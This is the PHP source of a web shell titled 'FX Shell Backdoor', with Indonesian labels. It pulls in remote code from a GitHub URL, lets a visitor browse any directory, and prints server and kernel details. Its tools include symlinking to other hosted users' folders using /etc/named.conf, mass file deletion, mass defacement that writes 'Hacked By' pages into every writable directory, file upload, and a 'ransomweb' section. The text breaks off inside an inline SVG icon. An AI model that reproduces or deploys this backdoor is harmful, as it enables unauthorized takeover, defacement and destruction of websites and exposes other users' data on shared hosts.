<?php
header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);
@clearstatcache();
@ini_set('log_errors',FALSE);
@ini_set('max_execution_time',FALSE);
@ini_set('output_buffering',FALSE);
@ini_set('display_errors', FALSE);

include("https://raw.githubusercontent.com/FierzaEriez/Mini-Shell-Backdoor/main/perm.php");

if (!empty($_GET['path'])) {
    chdir($_GET['path']);
}
?>
<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="title" content=":: FX Shell Backdoor ::">
    <meta name="description" content=":: FX Shell Backdoor ::">
    <meta name="keywords" content=":: FX Shell Backdoor ::">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <!-- CSS only -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <link rel="shortcut icon" href="https://i.ibb.co/4f3J9h0/guy-fawkes-mask.png" />
    <title>FX Shell Backdoor</title>

    <style>
    body {
        width: 100%;
        text-decoration: none;
        overflow-x: hidden !important;
        color: #fff;
    }
    .shell {
        width: 100%;
    }
    .tulisan {
        color: #fff;
        font-size: 12pt;
        margin-top: 15px;
        text-decoration: none;
    }
    .path {
        color: #fff;
        font-size: 12pt;
        text-decoration: none;
    }
    .path:hover {
        color: #c2c7d6;
    }
    .info {
        color: #fff;
        font-size: 12pt;
        text-decoration: none;
        margin-top: -50px;
    }
    .nav-link {
        color: #fff !important;
        text-decoration: none;
        font-size: 12pt;
        margin-top: 10px;
    }
    .navbar-brand {
        padding-top: 15px;
        color: #fff !important;
        text-decoration: none;
    }
    .file {
        width: 90%;
    }
    .uploader {
        background: 0 0 !important;
        color: #fff;
    }
    .menu {
        margin-top: 15px;
    }
    .tombol {
        margin-top: -30px;
        width: 100%;
        color: #fff;
    }
    .tutup {
    z-index: 999 !important;
    margin-top: -10px !important;
    visibility: visible !important;
    }
    .bgnya {
    background-color: transparent;
    visibility: hidden;
    }
    .lihat {
    visibility: visible !important;
    width: 126% !important;
    margin-top: -20px;
    margin-left: -30px;
    }
    .tools {
    visibility: visible;
    margin-top: -3px;
    }
    .tambah {
    margin-top: 20px;
    margin-bottom: 20px;
    }
    .label {
    margin-top: 10px;
    }
    .tambahdir {
        margin-top: 5px;
        color: #fff;
        width: 90%;
    }
    .klik {
        width: 45%;
        color: #fff;
    }
    ::marker {
        color: #f5f5f5;
        size: 100px !important;
    }
    .pathnya {
        margin-top: -10px;
    }
    .tablenya {
        overflow-x: scroll;
    }
    .pembatas{
        margin-top: 25px;
    }
    @media (min-width: 768px) {
        body {
            text-decoration: none;
            overflow-x: hidden;
            color: #fff;
        }
        .shell {
            width: 100%;
        }
        .uploader {
            background: 0 0 !important;
            color: #fff;
        }
        .tombol {
            margin-top: -30px;
            width: 100%;
            color: #fff;
        }
        .tutup {
            z-index: 999 !important;
            margin-top: -10px !important;
            visibility: visible !important;
            margin-left: -10px;
        }
        .bgnya {
            background-color: transparent;
            visibility: hidden;
        }
        .lihat {
            visibility: visible !important;
            width: 112% !important;
            margin-top: -20px;
            margin-left: -30px;
        }
        .tambah {
            margin-top: 30px;
            margin-bottom: 25px;
        }
        .label {
            margin-top: 10px;
        }
        .tambahdir {
            margin-top: 5px;
            color: #fff;
            width: 30%;
        }
        .klik {
            width: 50%;
            color: #fff;
        }
        .pembatas{
            margin-top: 25px;
        }
    }
    @media (min-width: 992px) {
        body {
            color: #fff;
            overflow-x: hidden !important;
            text-decoration: none;
        }
        .uploader {
            background: 0 0 !important;
            color: #fff;
        }
        .tombol {
            margin-top: -30px;
            width: 100%;
            color: #fff;
        }
        .file {
            width: 30%;
        }
        .tools {
            visibility: hidden;
            margin-left: -38px;
        }
        .tambah {
            margin-top: 30px;
            margin-bottom: 25px;
        }
        .label {
            margin-top: 10px;
        }
        .tambahdir {
            margin-top: 5px;
            color: #fff;
            width: 30%;
        }
        .klik {
            width: 50%;
            color: #fff;
        }
        .about {
            margin-left: 6px;
        }
        .tablenya {
            overflow: auto !important;
        }
        .pembatas{
            margin-top: 25px;
        }
    }
    </style>

    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

</head>
<?php
    if (isset($_GET['path'])) {
        $path = $_GET['path'];
    } else {
        $path = getcwd();
    }
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
?>
<body class="bg-dark animate__animated animate__fadeIn">
    <div class="shell container-fluid">
        <!-- navbar -->
        <nav class="navbar navbar-expand-lg navbar-light bg-dark">
            <div class="container-fluid">
                <h4 class="navbar-brand">
                <img class="gambar" src="https://i.ibb.co/Z615hHn/guy-fawkes-mask.png" alt="" width="45" height="45"
                        class="d-inline-block align-text-top">
                    <b>FX Shell Backdoor</b></br>
                </h4>
            
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
                    aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="40" height="40" viewBox="0 0 172 172"
                        style=" fill:#000000;">
                        <g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt"
                            stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0"
                            font-family="none" font-weight="none" font-size="none" text-anchor="none"
                            style="mix-blend-mode: normal">
                            <path d="M0,172v-172h172v172z" fill="none"></path>
                            <g fill="#ffffff">
                                <path
                                    d="M14.33333,35.83333v14.33333h143.33333v-14.33333zM14.33333,78.83333v14.33333h143.33333v-14.33333zM14.33333,121.83333v14.33333h143.33333v-14.33333z">
                                </path>
                            </g>
                        </g>
                    </svg>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav ms-auto">
                        <li class="nav-item">
                            <a class="nav-link active" aria-current="page" href="?home">
                                <svg class="tools" xmlns="http://www.w3.org/2000/svg" width="25" height="25"
                                    fill="currentColor" class="bi bi-house-door-fill" viewBox="0 0 16 16">
                                    <path
                                        d="M6.5 14.5v-3.505c0-.245.25-.495.5-.495h2c.25 0 .5.25.5.5v3.5a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-7a.5.5 0 0 0-.146-.354L13 5.793V2.5a.5.5 0 0 0-.5-.5h-1a.5.5 0 0 0-.5.5v1.293L8.354 1.146a.5.5 0 0 0-.708 0l-6 6A.5.5 0 0 0 1.5 7.5v7a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5z" />
                                </svg>
                                Home</a>
                        </li>
                        <li class="nav-item dropdown">
                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdownMenuLink" role="button"
                                data-bs-toggle="dropdown" aria-expanded="false">
                                <svg class="tools" xmlns="http://www.w3.org/2000/svg" width="25" height="25"
                                    fill="currentColor" class="bi bi-braces" viewBox="0 0 16 16">
                                    <path
                                        d="M2.114 8.063V7.9c1.005-.102 1.497-.615 1.497-1.6V4.503c0-1.094.39-1.538 1.354-1.538h.273V2h-.376C3.25 2 2.49 2.759 2.49 4.352v1.524c0 1.094-.376 1.456-1.49 1.456v1.299c1.114 0 1.49.362 1.49 1.456v1.524c0 1.593.759 2.352 2.372 2.352h.376v-.964h-.273c-.964 0-1.354-.444-1.354-1.538V9.663c0-.984-.492-1.497-1.497-1.6zM13.886 7.9v.163c-1.005.103-1.497.616-1.497 1.6v1.798c0 1.094-.39 1.538-1.354 1.538h-.273v.964h.376c1.613 0 2.372-.759 2.372-2.352v-1.524c0-1.094.376-1.456 1.49-1.456V7.332c-1.114 0-1.49-.362-1.49-1.456V4.352C13.51 2.759 12.75 2 11.138 2h-.376v.964h.273c.964 0 1.354.444 1.354 1.538V6.3c0 .984.492 1.497 1.497 1.6z" />
                                </svg>
                                Tools</a>
                            <ul class="dropdown-menu" aria-labelledby="navbarDropdownMenuLink">
                                <li>
                                    <?php echo "<a class=\"dropdown-item\" href=\"?path" . $path . "&aksi=massdel\">Mass Delete</a>"; ?>
                                </li>
                                <li>
                                    <?php echo "<a class=\"dropdown-item\" href=\"?path=" . $path . "&aksi=massdeface\">Mass Deface</a>"; ?>
                                </li>
                                <li>
                                    <?php echo "<a class=\"dropdown-item\" href=\"?path=" . $path . "&aksi=symlink\">Symlink</a>" ?>
                                </li>
                            </ul>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link about" href="?about">
                                <svg class="tools" xmlns="http://www.w3.org/2000/svg" width="25" height="25"
                                    fill="currentColor" class="bi bi-exclamation-octagon-fill" viewBox="0 0 16 16">
                                    <path
                                        d="M11.46.146A.5.5 0 0 0 11.107 0H4.893a.5.5 0 0 0-.353.146L.146 4.54A.5.5 0 0 0 0 4.893v6.214a.5.5 0 0 0 .146.353l4.394 4.394a.5.5 0 0 0 .353.146h6.214a.5.5 0 0 0 .353-.146l4.394-4.394a.5.5 0 0 0 .146-.353V4.893a.5.5 0 0 0-.146-.353L11.46.146zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4zm.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2z" />
                                </svg>
                                About</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>
        <!-- akhir navbar -->
        <br>
    <!-- list file/folder -->
    <div class="container-fluid">
        <div class="row">
        <?php
        function browsernya()
        {
            // deteksi browser
            $browser = "";

            if (strpos($_SERVER['HTTP_USER_AGENT'], 'Netscape')) {
                $browser = 'Netscape';
                echo $browser;
            } else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox')) {
                $browser = 'Mozilla Firefox';
                echo $browser;
            } else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome')) {
                $browser = 'Google Chrome';
                echo $browser;
            } else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera')) {
                $browser = 'Opera';
                echo $browser;
            } else if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE')) {
                $browser = 'Internet Explorer';
                echo $browser;
            } else {
                $browser = 'Lainnya';
                echo $browser;
            }
        }

        echo '<div class="info bg-dark">
                <hr class="pembatas">
                <li>Website : ' . $_SERVER["SERVER_NAME"] . '</li>
                <li>Ip Address : ' . $_SERVER["SERVER_ADDR"] . '</li>
                <li>Port : ' . $_SERVER["SERVER_PORT"] . '</li>
                <li>Kernel : ' . php_uname() . '</li>
                <li>Protokol : ' . $_SERVER["SERVER_PROTOCOL"] . '</li>
                <li>Save Data : ' . $_SERVER["HTTP_SAVE_DATA"] . '</li>
                <li>Koneksi : ' . $_SERVER["HTTP_CONNECTION"] . '</li>
                <li>Server : ' . $_SERVER["SERVER_SOFTWARE"] . '</li>
                <li>Root : ' . $_SERVER["DOCUMENT_ROOT"] . '</li>
                <li>G-Interface : ' . $_SERVER["GATEWAY_INTERFACE"] . '</li>
                <li>R-Method : ' . $_SERVER["REQUEST_METHOD"] . '</li>';?>
        <li>Browser : <?php browsernya() ?></li>
        <?php echo '<li>Version Shell : 1.0 (Release candidate)</li><li>Author : FierzaXploit/Mr.MF33</li></div>'; 
        echo "<p class='tulisan'><svg class='pathnya' xmlns=\"http://www.w3.org/2000/svg\" width=\"23\" height=\"23\" fill=\"currentColor\" class=\"bi bi-folder2-open\" viewBox=\"0 0 16 16\">
        <path d=\"M1 3.5A1.5 1.5 0 0 1 2.5 2h2.764c.958 0 1.76.56 2.311 1.184C7.985 3.648 8.48 4 9 4h4.5A1.5 1.5 0 0 1 15 5.5v.64c.57.265.94.876.856 1.546l-.64 5.124A2.5 2.5 0 0 1 12.733 15H3.266a2.5 2.5 0 0 1-2.481-2.19l-.64-5.124A1.5 1.5 0 0 1 1 6.14V3.5zM2 6h12v-.5a.5.5 0 0 0-.5-.5H9c-.964 0-1.71-.629-2.174-1.154C6.374 3.334 5.82 3 5.264 3H2.5a.5.5 0 0 0-.5.5V6zm-.367 1a.5.5 0 0 0-.496.562l.64 5.124A1.5 1.5 0 0 0 3.266 14h9.468a1.5 1.5 0 0 0 1.489-1.314l.64-5.124A.5.5 0 0 0 14.367 7H1.633z\"/>
      </svg> : ~/";
        foreach ($paths as $id => $pat) {
            if ($pat == '' && $id == 0) {
                $a = true;
                echo "
                <a class='path' href=\"?path=/\">/</a></li>
               ";
                continue;
            }
            if ($pat == '') continue;
            echo '<a href="?path=';
            for ($i = 0; $i <= $id; $i++) {
                echo "$paths[$i]";
                if ($i != $id) echo "/";
            }
            echo '" class="path">' . $pat . '</a>/';
        }

        /*Symlink*/
        if ($_GET['aksi'] == 'symlink') {
            if (!is_file('named.txt')) {
                $d00m = @file("/etc/named.conf");
            } else {
                $d00m = @file("named.txt");
            }
            if (!$d00m) {
                echo "<center>
            <br/>
            <font color='red'>Gagal Membaca /etc/named.conf</font>
            <br/><br/></center>";
            } else {
                echo "<center>
        <div class='tmp'></center>
            <table align='center' width='100%'>
                <thead class='bg-info'>
                    <th>Domains</th>
                    <th>Users</th>
                    <th>symlink </th>
                </thead>";
                foreach ($d00m as $dom) {
                    if (eregi("zone", $dom)) {
                        preg_match_all('#zone "(.*)"#', $dom, $domsws);
                        flush();
                        if (strlen(trim($domsws[1][0])) > 2) {
                            $user = posix_getpwuid(@fileowner("/etc/valiases/" . $domsws[1][0]));
                            flush();
                            $site = $user['name'];
                            @symlink("/", "sym/root");
                            $site = $domsws[1][0];
                            $ir = 'ir';
                            $il = 'il';
                            if (preg_match("/.^$ir/", $domsws[1][0]) or preg_match("/.^$il/", $domsws[1][0])) {
                                $site = ".$domsws[1][0].";
                            }
                            echo "
                            <tr>
                                <td>
                                    <a target='_blank' href=http://www." . $domsws[1][0] . "/>" . $site . " </a>
                                </td>
                                <td>
                                    " . $user['name'] . "
                                </td>
                                <td>
                                    <a href='sym/root/home/" . $user['name'] . "/public_html' target='_blank'>Symlink</a>
                                </td>
                            </tr>";
                            flush();
                            flush();
                        }
                    }
                }
                echo "</table>
                </div><br><br>";
            }
        }

        //mass delete
        if ($_GET['aksi'] == "massdel") {
            function hapus_massal($dir, $namafile)
            {
                if (is_writable($dir)) {
                    $dira = scandir($dir);
                    foreach ($dira as $dirb) {
                        $dirc = "$dir/$dirb";
                        $lokasi = $dirc . '/' . $namafile;
                        if ($dirb === '.') {
                            if (file_exists("$dir/$namafile")) {
                                unlink("$dir/$namafile");
                            }
                        } elseif ($dirb === '..') {
                            if (file_exists("" . dirname($dir) . "/$namafile")) {
                                unlink("" . dirname($dir) . "/$namafile");
                            }
                        } else {
                            if (is_dir($dirc)) {
                                if (is_writable($dirc)) {
                                    if ($lokasi) {
                                        echo "$lokasi > Terhapus\n";
                                        unlink($lokasi);
                                        $massdel = hapus_massal($dirc, $namafile);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            if ($_POST['start']) {
                echo "<textarea class='form-control' rows='8' disabled='disabled'>";
                hapus_massal($_POST['d_dir'], $_POST['d_file']);
                echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
            } else {
                echo "<center><p>{ Mass Delete }</p></center>
                <form method='post'>
                <p><i class='fa fa-folder'></i> Lokasi</p>
                <input type='text' name='d_dir' value='$dir' class='form-control'><br>
                <p><i class ='fa fa-file'></i> Nama File</p>
                <input type='text' name='d_file' placeholder='index.php' class='form-control'><br>
                <input type='submit' name='start' value='Hapus' class='btn btn-danger form-control'>
                <br><br>
                </form>";
            }
        }

        /*
    Mass Deface
*/
        if ($_GET['aksi'] == 'massdeface') {

            function tipe_massal($dir, $namafile, $isi_script)
            {
                if (is_writable($dir)) {
                    $dira = scandir($dir);
                    foreach ($dira as $dirb) {
                        $dirc = "$dir/$dirb";
                        $lokasi = $dirc . '/' . $namafile;
                        if ($dirb === '.') {
                            file_put_contents($lokasi, $isi_script);
                        } elseif ($dirb === '..') {
                            file_put_contents($lokasi, $isi_script);
                        } else {
                            if (is_dir($dirc)) {
                                if (is_writable($dirc)) {
                                    echo "Berhasil => $lokasi\n";
                                    file_put_contents($lokasi, $isi_script);
                                    $MassDeface = tipe_massal($dirc, $namafile, $isi_script);
                                }
                            }
                        }
                    }
                }
            }

            function tipe_biasa($dir, $namafile, $isi_script)
            {
                if (is_writable($dir)) {
                    $dira = scandir($dir);
                    foreach ($dira as $dirb) {
                        $dirc = "$dir/$dirb";
                        $lokasi = $dirc . '/' . $namafile;
                        if ($dirb === '.') {
                            file_put_contents($lokasi, $isi_script);
                        } elseif ($dirb === '..') {
                            file_put_contents($lokasi, $isi_script);
                        } else {
                            if (is_dir($dirc)) {
                                if (is_writable($dirc)) {
                                    echo "Berhasil => $dirb/$namafile\n";
                                    file_put_contents($lokasi, $isi_script);
                                }
                            }
                        }
                    }
                }
            }

            if ($_POST['start']) {

                echo "<textarea class='form-control' rows='8' disabled='disabled'>";
                if ($_POST['tipe'] == 'mahal') {
                    tipe_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                } elseif ($_POST['tipe'] == 'murah') {
                    tipe_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
                }
                echo "</textarea><a href='?dir=$dir' class='btn btn-info btn-block mt-3'>Kembali</a>";
            } else {
                echo "<form method='post'>
            <center>
                <p>{ Mass Deface }</p>
                <input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
                <label for='toggle-on' class='butn'>Biasa</label>
                <input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
                <label for='toggle-off' class='butn'>Masal</label>
            </center><hr>
            <p><i class='fa fa-folder'></i> Lokasi</p>
            <input type='text' name='d_dir' value='$dir' class='form-control'><br>
            <p><i class ='fa fa-file'></i> Nama File</p>
            <input type='text' name='d_file' placeholder='index.php' class='form-control'><br/>
            <p><i class ='fa fa-file'></i> Isi File</p>
            <textarea name='script' class='form-control' rows='5' placeholder='Hacked By Mr.MF33'></textarea><br/>
            <input type='submit' name='start' value='Mass Deface' class='btn btn-danger form-control'><br/>
            <br><br>
            </form>";
            }
        }

        //upload file
        if (isset($_POST['btn'])) {
            $nama = $_FILES['upl']['name'];
            $lokasi = $_FILES['upl']['tmp_name'];
            $folder = "";
            if (move_uploaded_file($lokasi, $folder . $nama)) {
                echo '<script>swal("Berhasil Upload!!!", "Selamat anda Bisa Mengupload File", "success"); </script>';
            } else {
                echo '<script> swal("Gagal Upload!!!", "Maaf Tidak Bisa Upload File", "error"); </script>';
            }
        }

        echo '
        <form method="post" enctype="multipart/form-data">
            <div class="uploader file input-group input-group-sm mb-3 ms-auto">
                <input type="file" name="upl" class="form-control" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
                <button name="btn" class="btn btn-secondary" type="submit" id="inputGroupFileAddon04">Upload</button>
            </div>
        </form>

        <!-- tambah file/folder & ransomweb -->
        <div class="tambah">
            <div class="container-fluid">
                <div class="row row-cols-auto">
                    <!-- fungsi tambah file -->
                    <div class="col-4">
                        <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="26" height="26"
                            fill="currentColor" class="bi bi-file-earmark-plus" viewBox="0 0 16 16">
                            <path
                                d="M8 6.5a.5.5 0 0 1 .5.5v1.5H10a.5.5 0 0 1 0 1H8.5V11a.5.5 0 0 1-1 0V9.5H6a.5.5 0 0 1 0-1h1.5V7a.5.5 0 0 1 .5-.5z" />
                            <path
                                d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5L14 4.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5h-2z" />
                        </svg>
                        <a class="path" href="?path=' . $path . '&aksi=buatfile">Buat File</a>
                    </div>
                    <!-- akhir fungsi tambah file -->

                    <!-- fungsi tambah folder -->
                    <div class="col-4">
                        <svg class="icon" xmlns="http://www.w3.org/2000/svg" width="30" height="30"
                            fill="currentColor" class="bi bi-folder-plus" viewBox="0 0 16 16">
                            <path
                                d="m.5 3 .04.87a1.99 1.99 0 0 0-.342 1.311l.637 7A2 2 0 0 0 2.826 14H9v-1H2.826a1 1 0 0 1-.995-.91l-.637-7A1 1 0 0 1 2.19 4h11.62a1 1 0 0 1 .996 1.09L14.54 8h1.005l.256-2.819A2 2 0 0 0 13.81 3H9.828a2 2 0 0 1-1.414-.586l-.828-.828A2 2 0 0 0 6.172 1H2.5a2 2 0 0 0-2 2zm5.672-1a1 1 0 0 1 .707.293L7.586 3H2.19c-.24 0-.47.042-.683.12L1.5 2.98a1 1 0 0 1 1-.98h3.672z" />
                            <path
                                d="M13.5 10a.5.5 0 0 1 .5.5V12h1.5a.5.5 0 1 1 0 1H14v1.5a.5.5 0 1 1-1 0V13h-1.5a.5.5 0 0 1 0-1H13v-1.5a.5.5 0 0 1 .5-.5z" />
                        </svg>
                        <a class="path" href="?path=' . $path . '&aksi=buatfolder">Buat Folder</a>
                    </div>
                    <!-- Akhir fungsi tambah folder -->

                    <!-- funsgi auto create ransomweb -->
                    <div class="col-4">
                        <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
                        width="30" height="30"
                        viewBox="0 0 172 172"
                        style=" fill:#000000;"><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><path d="M0,172v-172h172v172z" fill="none"></path><g fill="#ffffff"><path d="M86,0c-8.82844,0 -16.125,7.29656 -16.125,16.125c0,1.98875 0.51063,3.655 0.9675,5.16c0.22844,0.7525 0.48375,1.45125 0.645,1.935c0.02688,0.1075 0.08063,0.13438 0.1075,0.215c0.01344,0.05375 0,0.30906 0,0.3225c0.08063,0.26875 0.18813,0.51063 0.3225,0.7525c4.04469,8.42531 5.67063,14.02875 5.9125,17.2c0,0.04031 0,0.06719 0,0.1075c-6.40969,1.27656 -12.255,3.82969 -17.3075,7.31c-0.34937,-0.34937 -0.63156,-0.73906 -0.9675,-1.1825c-1.86781,-2.4725 -2.86219,-6.45 -2.58,-7.6325c0.06719,-0.24187 0.09406,-0.49719 0.1075,-0.7525v-0.645c0.29563,-1.10187 0.7525,-2.23062 0.7525,-3.87c0,-8.82844 -7.40406,-16.125 -16.2325,-16.125c-8.82844,0 -16.125,7.29656 -16.125,16.125c0,6.85313 4.32688,13.0075 10.75,15.265c0.08063,0.02688 0.13438,0.08063 0.215,0.1075c3.09063,1.31688 7.32344,4.25969 10.2125,7.4175c0.95406,1.03469 1.66625,2.12313 2.2575,3.1175c-4.79719,7.13531 -7.6325,15.8025 -7.6325,25.0475c0,3.03688 0.40313,5.95281 0.7525,8.7075c0.01344,0.215 0.05375,0.43 0.1075,0.645c0,0.02688 0,0.08063 0,0.1075c0,0.06719 0,0.14781 0,0.215c-0.12094,0.69875 -0.645,0.94063 -1.505,1.3975c-1.26312,0.67188 -3.46687,0.52406 -3.44,0.5375l-0.1075,0.1075c-2.37844,-1.45125 -5.09281,-2.4725 -8.17,-2.4725c-8.82844,0 -16.2325,7.40406 -16.2325,16.2325c0,8.82844 7.40406,16.125 16.2325,16.125c5.28094,0 9.98406,-2.56656 13.0075,-6.45c0.04031,-0.04031 0.06719,-0.06719 0.1075,-0.1075c1.74688,-2.4725 4.15219,-4.48812 6.1275,-5.2675c1.97531,-0.77937 3.06375,-0.71219 4.515,0.645c0.33594,0.3225 0.73906,0.59125 1.1825,0.7525c7.10844,7.02781 16.555,11.94594 26.9825,13.2225c0.24188,1.505 0.36281,2.95625 0.215,4.3c-0.38969,3.61469 -2.16344,6.51719 -3.3325,7.4175c-4.60906,2.72781 -7.8475,7.83406 -7.8475,13.76c0,8.82844 7.29656,16.125 16.125,16.125c8.82844,0 16.125,-7.29656 16.125,-16.125c0,-6.58437 -1.90812,-14.60656 -3.225,-21.5c-0.34937,-1.86781 -0.645,-3.655 -0.86,-5.2675c11.12625,-3.25187 20.47875,-10.44094 26.445,-20.21c1.65281,0.72563 3.45344,2.00219 5.0525,3.5475c3.19813,3.07719 5.4825,6.665 5.4825,6.665c0.36281,0.56438 0.88688,1.02125 1.505,1.29c0.1075,0.08063 0.215,0.14781 0.3225,0.215c2.84875,4.12531 7.14875,7.31 12.7925,7.31c8.82844,0 16.125,-7.29656 16.125,-16.125c0,-8.82844 -7.29656,-16.125 -16.125,-16.125c-2.83531,0 -5.65719,0.84656 -8.17,2.365l-0.1075,-0.1075c-2.94281,1.27656 -5.21375,0.87344 -7.955,-0.43c-1.19594,-0.56437 -2.43219,-1.33031 -3.655,-2.15c0.69875,-3.09062 0.9675,-6.1275 0.9675,-9.3525v-1.29c0.04031,-0.1075 0.08063,-0.215 0.1075,-0.3225c0.12094,-0.14781 0.41656,-0.55094 0.9675,-0.86c1.08844,-0.63156 2.87563,-1.33031 4.8375,-1.935c3.93719,-1.20937 8.86875,-1.89469 12.685,-1.1825v-0.1075c1.12875,0.34938 2.31125,0.5375 3.1175,0.5375c7.00094,0 13.0075,-5.75125 13.0075,-13.115c0,-7.36375 -6.35594,-12.685 -13.4375,-12.685c-4.81062,0 -8.9225,2.75469 -10.965,6.7725l-0.1075,-0.1075c-1.26312,1.78719 -4.90469,3.92375 -8.385,4.515c-1.74687,0.29563 -3.39969,0.25531 -4.6225,-0.1075c-1.22281,-0.36281 -1.92156,-0.90031 -2.4725,-1.8275c-0.25531,-0.38969 -0.57781,-0.71219 -0.9675,-0.9675c-0.06719,-0.08062 -0.13437,-0.14781 -0.215,-0.215c-5.50937,-9.16437 -14.13625,-16.34 -24.51,-19.6725c-0.13437,-0.08062 -0.28219,-0.14781 -0.43,-0.215c-0.1075,-0.04031 -0.215,-0.08062 -0.3225,-0.1075c-4.4075,-1.90812 -4.86437,-4.27312 -4.73,-7.31c0.13438,-3.07719 1.81406,-6.61125 2.4725,-7.6325c0.01344,-0.01344 -0.01344,-0.09406 0,-0.1075c2.21719,-3.15781 5.375,-6.50375 5.375,-11.9325c0,-8.82844 -7.29656,-16.125 -16.125,-16.125zM86,6.88c4.93156,0 9.245,4.31344 9.245,9.245c0,2.795 -1.59906,4.35375 -4.1925,8.0625c-1.42437,2.13656 -3.44,6.235 -3.655,11.2875c-0.20156,4.73 2.15,10.46781 8.17,13.545c0.1075,0.08063 0.215,0.14781 0.3225,0.215c0.17469,0.12094 0.34938,0.22844 0.5375,0.3225c0.1075,0.05375 0.215,0.06719 0.3225,0.1075c0.20156,0.09406 0.43,0.16125 0.645,0.215c9.27188,2.87563 17.02531,9.41969 21.715,17.845c0.3225,0.59125 0.80625,1.075 1.3975,1.3975c1.47813,1.76031 3.42656,2.94281 5.4825,3.5475c2.52625,0.7525 5.18688,0.7525 7.74,0.3225c5.11969,-0.87344 10.03781,-3.35937 12.9,-7.4175c0.12094,-0.17469 0.22844,-0.34937 0.3225,-0.5375c0.83313,-1.86781 2.51281,-3.1175 5.0525,-3.1175c3.92375,0 6.5575,2.16344 6.5575,5.805c0,3.64156 -2.80844,6.235 -6.1275,6.235c-1.03469,0 -0.99437,-0.06719 -0.86,0c-0.30906,-0.16125 -0.63156,-0.26875 -0.9675,-0.3225c-5.4825,-1.00781 -11.26062,-0.06719 -16.0175,1.3975c-2.37844,0.72563 -4.515,1.58563 -6.235,2.58c-1.55875,0.90031 -3.07719,1.55875 -3.87,3.7625c-0.47031,0.65844 -0.69875,1.45125 -0.645,2.2575v2.365c0,1.94844 -0.09406,3.7625 -0.3225,5.4825c-0.25531,-0.02687 -0.49719,-0.02687 -0.7525,0c-0.1075,0 -0.215,0 -0.3225,0c-1.42437,0.24188 -2.53969,1.34375 -2.795,2.75469c-0.26875,1.42438 0.37625,2.84875 1.6125,3.58781c0.48375,0.3225 1.16906,0.79281 1.72,1.1825c0.40313,0.55094 0.9675,0.95406 1.6125,1.1825c1.74688,1.23625 3.66844,2.48594 5.9125,3.5475c3.80281,1.80063 8.68063,2.70094 13.6525,0.5375c0.18813,-0.09406 0.36281,-0.20156 0.5375,-0.3225c1.47813,-0.98094 3.19813,-1.3975 4.945,-1.3975c4.93156,0 9.245,4.31344 9.245,9.245c0,4.93156 -4.31344,9.245 -9.245,9.245c-3.78937,0 -6.73219,-2.16344 -8.2775,-5.2675c-0.33594,-0.645 -0.86,-1.16906 -1.505,-1.505c-0.63156,-0.9675 -2.13656,-3.5475 -5.4825,-6.7725c-1.97531,-1.89469 -4.32687,-3.73562 -7.095,-4.945c-0.95406,-0.41656 -1.94844,-0.7525 -3.01,-0.9675c-0.48375,-0.18812 -0.99437,-0.25531 -1.505,-0.215c-1.6125,-0.13437 -3.30562,0.04031 -4.945,0.645c-1.23625,0.37625 -2.15,1.41094 -2.37844,2.6875c-0.215,1.26313 0.28219,2.55313 1.30344,3.3325c-4.50156,6.18125 -10.68281,10.8575 -17.9525,13.545c0.63156,-1.15562 0.55094,-2.55312 -0.20156,-3.62812c-0.7525,-1.075 -2.05594,-1.62594 -3.34594,-1.42438c-0.14781,0.02688 -0.29562,0.06719 -0.43,0.1075c-0.52406,0.13438 -0.99437,0.38969 -1.3975,0.7525c-2.64719,2.23063 -2.67406,5.28094 -2.58,8.2775c0,0.13438 0,0.29563 0,0.43c-0.05375,0.55094 0.01344,1.10188 0.215,1.6125c0.20156,2.49938 0.5375,5.14656 1.075,7.955c1.35719,7.12188 3.1175,15.10375 3.1175,20.21c0,4.93156 -4.31344,9.245 -9.245,9.245c-4.93156,0 